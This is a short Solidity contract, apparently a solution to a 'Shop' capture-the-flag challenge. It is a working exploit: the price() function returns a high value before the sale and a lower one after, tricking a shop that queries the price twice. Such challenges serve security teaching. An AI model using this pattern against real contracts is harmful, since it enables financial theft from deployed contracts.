// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { IBuyer } from "./Shop.sol";

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract SolveShop is IBuyer {
    // storage
    uint256 immutable REF_PRICE;

    constructor(uint256 _refPrice) {
        REF_PRICE = _refPrice;
    }

    function price() external view returns (uint256) {
        IShop shop = IShop(msg.sender);

        if (!shop.isSold()) {
            return REF_PRICE + 20;
        } else {
            return REF_PRICE - 20;
        }
    }

    function buy(address shopAddr) external {
        IShop shop = IShop(shopAddr);
        shop.buy();
    }
}
